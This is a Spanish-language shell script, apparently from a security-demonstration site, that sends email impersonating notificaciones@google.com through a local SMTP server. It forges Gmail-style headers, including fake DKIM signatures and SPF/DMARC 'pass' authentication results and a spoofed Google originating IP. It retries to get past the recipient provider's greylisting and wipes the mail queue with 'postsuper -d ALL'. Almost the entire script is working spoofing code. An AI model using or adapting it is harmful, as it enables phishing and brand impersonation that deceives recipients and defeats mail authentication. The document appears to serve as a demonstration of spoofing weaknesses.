#!/bin/sh

# elimina cola correos SMTP anteior
postsuper -d ALL

# suplanta Google
# simula X Mailer
# simula verificaciones
# hackingyseguridad.com


HOST="localhost"
PORT="25"

send_email_with_retry() {
    local from_email="notificaciones@google.com"
    local to_email="antonio.taboada@telefonica.net"
    local max_retries=5
    local retry_delay=600  # 10 minutos en segundos
    local greylisting_detected=0

    for attempt in $(seq 1 $max_retries); do
        echo "Intento $attempt de $max_retries - $(date)"

        (
            echo "EHLO mx.google.com"
            sleep 2
            echo "MAIL FROM: <$from_email>"
            sleep 2
            echo "RCPT TO: <$to_email>"
            sleep 2
            echo "DATA"
            sleep 2

            # Cabeceras mejoradas específicas para Google
            echo "From: notificaciones@google.com <$from_email>"
            echo "To: $to_email"
            echo "Subject: Suplantacion email @google.com - Intento $attempt"
            echo "Date: $(date -R)"
            echo "Message-ID: <$(date +%Y%m%d%H%M%S).$(openssl rand -hex 8)@google.com>"
            echo "MIME-Version: 1.0"
            echo "Content-Type: text/plain; charset=\"utf-8\""
            echo "Content-Transfer-Encoding: quoted-printable"
            echo "X-Mailer: Gmail Web Interface"
            echo "X-Originating-IP: 142.250.185.142"
            echo "X-Priority: 1 (Alta)"
            echo "X-MSMail-Priority: High"
            echo "Importance: high"
            echo "X-Google-Client: GMAIL-WEB"
            echo "X-Gmail-User: notificaciones"
            echo "X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=20230601; t=$(date +%s); h=from:to:subject:date:message-id:mime-version:content-type; bh=K8F7E3=; b=D5A9B2="
            echo "X-Google-SPF: pass (google.com: domain of $from_email designates 142.250.185.142 as permitted sender) client-ip=142.250.185.142;"
            echo "X-Authentication-Results: mx.google.com; dkim=pass header.i=@google.com; spf=pass smtp.mailfrom=$from_email; dmarc=pass header.from=google.com"
            echo "Authentication-Results: mx.google.com; dkim=pass header.i=@google.com; spf=pass smtp.mailfrom=$from_email; dmarc=pass header.from=google.com"
            echo "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=20230601; t=$(date +%s); bh=K8F7E3=; h=from:to:subject:date:message-id:mime-version:content-type:content-transfer-encoding; b=E9D4C7="
            echo "Received: from smtp.google.com ([142.250.185.142]) by mx.google.com with ESMTP id $(date +%Y%m%d%H%M%S).$(openssl rand -hex 4); $(date -R)"
            echo "X-Envio-Google: INTERNO"
            echo ""
            echo "Hola,"
            echo ""
            echo ""
            echo "Suplantacion de email origen @google.com"
            echo ""
            echo "Intento de entrega: $attempt"
            echo "Fecha: $(date)"
            echo ""
            echo ""
            echo ""
            echo "Saludos,"
            echo "Antonio Taboada"
            echo "http://www.hackingyseguridad.com/"
            echo "."
            sleep 2
            echo "QUIT"
        ) | telnet $HOST $PORT 2>&1 > /tmp/email_result_$attempt.txt

        # Verificar resultado
        if grep -q "250 OK" /tmp/email_result_$attempt.txt; then
            echo "✓ Email enviado exitosamente en el intento $attempt"
            return 0
        elif grep -q "Greylisting" /tmp/email_result_$attempt.txt || grep -q "451" /tmp/email_result_$attempt.txt; then
            echo "⏳ Greylisting detectado por Telefónica. Esperando $retry_delay segundos..."
            greylisting_detected=1
            if [ $attempt -lt $max_retries ]; then
                echo "🕒 Reintentando en $((retry_delay / 60)) minutos..."
                sleep $retry_delay
                retry_delay=$((retry_delay + 300))
            fi
        else
            echo "✗ Error en el envío (intento $attempt). Ver /tmp/email_result_$attempt.txt"
            cat /tmp/email_result_$attempt.txt | tail -5
        fi
    done

    if [ $greylisting_detected -eq 1 ]; then
        echo "⚠️  Greylisting persistente. El servidor de Telefónica está bloqueando temporalmente."
        echo "💡 Sugerencia: Espera 10-15 minutos y ejecuta el script nuevamente."
    else
        echo "❌ No se pudo enviar el email después de $max_retries intentos"
    fi
    return 1
}

echo "..."
echo ""

send_email_with_retry

echo ""
echo "Estado de la cola:"
mailq
echo ""
echo "Forzando procesamiento de cola..."
postqueue -f
echo ""
echo "Para limpiar completamente: postsuper -d ALL"
echo ""

